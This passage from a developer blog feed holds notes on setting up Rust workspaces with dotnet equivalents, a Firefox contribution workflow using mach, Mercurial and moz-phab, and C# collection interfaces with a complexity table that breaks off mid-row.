<h3 id="1001-新建一个工作空间">10.0.1 新建一个工作空间</h3>
<pre><code class="language-sh">mkdir &lt;workspace&gt;
cd &lt;workspace&gt;
touch Cargo.toml
</code></pre>
<h4 id="对映的-dotnet-操作">对映的 dotnet 操作</h4>
<pre><code class="language-sh">dotnet new sln -o &lt;workspace&gt;
cd &lt;workspace&gt;
</code></pre>
<h3 id="1002-新建一个不带-git-的-lib-crate">10.0.2 新建一个不带 git 的 lib crate</h3>
<pre><code class="language-sh">cargo new &lt;lib_name&gt; --lib --vcs none
</code></pre>
<h4 id="对映的-dotnet-操作-2">对映的 dotnet 操作</h4>
<pre><code class="language-sh">dotnet new classlib -o &lt;lib_name&gt;
</code></pre>
<h3 id="1003-新建一个不带-git-的-bin-crate">10.0.3 新建一个不带 git 的 bin crate</h3>
<pre><code class="language-sh">cargo new &lt;name&gt; --vcs none
</code></pre>
<h4 id="对映的-dotnet-操作-3">对映的 dotnet 操作</h4>
<pre><code class="language-sh">dotnet new console -o &lt;bin_name&gt;
</code></pre>
<h3 id="1004-构建依赖关系">10.0.4 构建依赖关系</h3>
<p>添加以下内容到 <code>&lt;workspace&gt;/Cargo.toml</code></p>
<pre><code class="language-toml">[workspace]
members = [
    &quot;&lt;lib_name&gt;&quot;,
    &quot;&lt;bin_name&gt;&quot;
]
</code></pre>
<p>添加以下内容到 <code>&lt;bin_name&gt;/Cargo.toml</code> 以表明依赖关系</p>
<pre><code class="language-toml">[dependencies]
&lt;lib_name&gt; = { path = &quot;../&lt;lib_name&gt;&quot; }
</code></pre>
<h4 id="对映的-dotnet-操作-4">对映的 dotnet 操作</h4>
<pre><code class="language-sh">dotnet sln add &lt;lib_name&gt;/&lt;lib_name&gt;.csproj
dotnet sln add &lt;bin_name&gt;/&lt;bin_name&gt;.csproj
dotnet add ./&lt;bin_name&gt;/&lt;bin_name&gt;.csproj reference ./&lt;lib_name&gt;/&lt;lib_name&gt;.csproj
</code></pre>
<h2 id="102-模块系统">10.2 模块系统</h2>
<ul>
<li><a href="https://kaisery.gitbooks.io/rust-book-chinese/content/content/Crates%20and%20Modules%20crate%20%E5%92%8C%E6%A8%A1%E5%9D%97.html">包装箱和模块</a></li>
<li><a href="https://kaisery.gitbooks.io/rust-book-chinese/content/content/Testing%20%E6%B5%8B%E8%AF%95.html">测试</a></li>
<li>每一个 <code>mod.rs</code> 都要添加 <code>pub mod &lt;submod&gt;</code> 。</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Git] Mozilla Development Flow]]></title>
        <id>https://zhangyue-vhyt.github.io/post/mozilla-development-flow/</id>
        <link href="https://zhangyue-vhyt.github.io/post/mozilla-development-flow/">
        </link>
        <updated>2020-05-22T02:43:38.000Z</updated>
        <content type="html"><![CDATA[<h1 id="wsl2-debianubuntu">WSL2 Debian/Ubuntu</h1>
<pre><code class="language-sh">sudo apt update
sudo apt install imagemagick python3-pip build-essential
pip3 install mozphab
</code></pre>
<h1 id="build-firefox">Build Firefox</h1>
<ul>
<li><a href="https://firefox-source-docs.mozilla.org/contributing/vcs/mercurial.html#using-hg-clone">Mercurial Overview</a></li>
<li><a href="https://firefox-source-docs.mozilla.org/contributing/contribution_quickref.html">Firefox Contributors' Quick Reference</a></li>
</ul>
<h2 id="artifact-mode">Artifact Mode</h2>
<blockquote>
<p>If you are not working on the C/C++ files you can also opt for Artifact Builds which are much faster. To enable artifact build set up a <code>.mozconfig</code> file with the following options:</p>
<pre><code># Automatically download and use compiled C++ components:
# This option will disable C/C++ compilation
ac_add_options --enable-artifact-builds

# Write build artifacts to (not mandatory):
mk_add_options MOZ_OBJDIR=./objdir-frontend
</code></pre>
<p>If you plan to walk through code with a debugger, set up a <code>.mozconfig</code> file with the following options:</p>
<pre><code>ac_add_options --disable-optimize
ac_add_options --enable-debug
</code></pre>
<p>--- <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Developer_guide/Build_Instructions/Simple_Firefox_build/Linux_and_MacOS_build_preparation">Linux build preparation</a></p>
</blockquote>
<h1 id="perftest-notebook">Perftest Notebook</h1>
<ul>
<li><a href="https://wiki.mozilla.org/TestEngineering/Performance/NewContributors">New Contributors to Perftest</a></li>
</ul>
<h2 id="test">Test</h2>
<ul>
<li>Linter: <code>./mach lint --warnings --outgoing</code></li>
<li>Unit Test:: <code>./mach perftest-test</code> or <code>./mach perftest-test -s</code></li>
<li>Debug Run: <code>./mach perftest python/mozperftest/mozperftest/tests/example.js</code></li>
</ul>
<h2 id="version-contral-by-mercurial">Version Contral by Mercurial</h2>
<ul>
<li>Pull: <code>hg pull --verbose https://hg.mozilla.org/mozilla-central/</code></li>
<li>Commit: Using VSCode Extension.</li>
<li>Changes: Using VSCode Extension.</li>
<li>Amend: <code>hg commit --amend</code></li>
<li>Check the current and latest revisions: <code>hg head</code> or <code>hg heads</code></li>
<li>Update: <code>hg up -r &lt;revision&gt;</code></li>
<li>Rebase: <code>hg rebase -r &lt;current_revision&gt; --dest &lt;latest_revision&gt;</code></li>
<li>Submit: <code>moz-phab</code> (Make sure <code>MozPhab</code> is installed by <code>pip3</code>)</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[《C#高级编程》- The C# Language Part 2]]></title>
        <id>https://zhangyue-vhyt.github.io/post/csharp-notes-2/</id>
        <link href="https://zhangyue-vhyt.github.io/post/csharp-notes-2/">
        </link>
        <updated>2020-05-09T08:09:24.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>Chapter 18 是关于 IDE 的，不重要所以未收录。</p>
<h1 id="chapter-10-collections">Chapter 10: Collections</h1>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/standard/collections/">集合和数据结构</a></li>
<li><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/programming-guide/concepts/collections">集合 (C#)</a></li>
</ul>
<h2 id="collection-interfaces-and-types">COLLECTION INTERFACES AND TYPES</h2>
<table>
<thead>
<tr>
<th>INTERFACE</th>
<th>DESCRIPTION</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>IEnumerable&lt;T&gt;</code></td>
<td>The interface <code>IEnumerable</code> is required by the <code>foreach</code> statement. This interface defines the method <code>GetEnumerator</code>, which returns an enumerator that implements the <code>IEnumerator</code> interface.</td>
</tr>
<tr>
<td><code>ICollection&lt;T&gt;</code></td>
<td><code>ICollection&lt;T&gt;</code> is implemented by generic collection classes. With this you can get the number of items in the collection <code>Count</code> property), and copy the collection to an array (<code>CopyTo</code> method). You can also add and remove items from the collection (<code>Add, Remove, Clear</code>).</td>
</tr>
<tr>
<td><code>IList&lt;T&gt;</code></td>
<td>The <code>IList&lt;T&gt;</code> interface is for lists where elements can be accessed from their position. This interface defines an indexer, as well as ways to insert or remove items from specific positions (<code>Insert, RemoveAt</code> methods). <code>IList&lt;T&gt;</code> derives from <code>ICollection&lt;T&gt;</code>.</td>
</tr>
<tr>
<td><code>ISet&lt;T&gt;</code></td>
<td>This interface is implemented by sets. Sets allow combining different sets into a union, getting the intersection of two sets, and checking whether two sets overlap. <code>ISet&lt;T&gt;</code> derives from <code>ICollection&lt;T&gt;</code>.</td>
</tr>
<tr>
<td><code>IDictionary&lt;TKey, TValue&gt;</code></td>
<td>The interface <code>IDictionary&lt;TKey, TValue&gt;</code> is implemented by generic collection classes that have a key and a value. With this interface all the keys and values can be accessed, items can be accessed with an indexer of type key, and items can be added or removed.</td>
</tr>
<tr>
<td><code>ILookup&lt;TKey, TValue&gt;</code></td>
<td>Like the <code>IDictionary&lt;TKey, TValue&gt;</code> interface, lookups have keys and values. However, with lookups the collection can contain multiple values with one key.</td>
</tr>
<tr>
<td><code>IComparer&lt;T&gt;</code></td>
<td>The interface <code>IComparer&lt;T&gt;</code> is implemented by a comparer and used to sort elements inside a collection with the <code>Compare</code> method.</td>
</tr>
<tr>
<td><code>IEqualityComparer&lt;T&gt;</code></td>
<td><code>IEqualityComparer&lt;T&gt;</code>  is implemented by a comparer that can be used for keys in a dictionary. With this interface the objects can be compared for equality.</td>
</tr>
</tbody>
</table>
<h2 id="performance">PERFORMANCE</h2>
<p>COLLECTION|ADD|INSERT|REMOVE|ITEM|SORT|FIND</p>
<table>
<thead>
<tr>
<th>COLLECTION</th>
<th>ADD</th>
<th>INSERT</th>
<th>REMOVE</th>
<th>ITEM</th>
<th>SORT</th>
<th>FIND</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>List&lt;T&gt;</code></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> or <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> if the collection must be resized</td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mi>log</mi><mo>⁡</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O (n \log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> worst case <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><msup><mi>n</mi><mn>2</mn></msup><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n ^ 2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
</tr>
<tr>
<td><code>Stack&lt;T&gt;</code></td>
<td><code>Push</code>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>, or <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> if the stack must be resized</td>
<td>n/a</td>
<td><code>Pop</code>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td>n/a</td>
<td>n/a</td>
<td>n/a</td>
</tr>
<tr>
<td><code>Queue&lt;T&gt;</code></td>
<td><code>Enqueue</code>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>, or <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> if the queue must be resized</td>
<td>n/a</td>
<td><code>Dequeue</code>, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td>n/a</td>
<td>n/a</td>
<td>n/a</td>
</tr>
<tr>
<td><code>HashSet&lt;T&gt;</code></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> or <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> if the set must be resized</td>
<td><code>Add</code> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> or <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td>n/a</td>
<td>n/a</td>
<td>n/a</td>
</tr>
<tr>
<td><code>SortedSet&lt;T&gt;</code></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> or <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> if the set must be resized</td>
<td><code>Add</code> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> or <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td>n/a</td>
<td>n/a</td>
<td>n/a</td>
</tr>
<tr>
<td><code>LinkedList&lt;T&gt;</code></td>
<td><code>AddLast</code> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td><code>Add After</code> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td>n/a</td>
<td>n/a</td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
</tr>
<tr>
<td><code>Dictionary&lt;TKey, TValue&gt;</code></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> or <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td>n/a</td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td>
<td>n/a</td>
<td>n/a</td>
</tr>
<tr>
<td><code>SortedDictionary&lt;TKey, TValue&gt;</code></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td>n/a</td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td>n/a</td>
<td>n/a</td>
</tr>
<tr>
<td><code>SortedList&lt;TKey, TValue&gt;</code></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> for unsorted data, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> for end of list, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> if resize is needed</td>
<td>n/a</td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> to read/write, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> if the key is in the list, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span 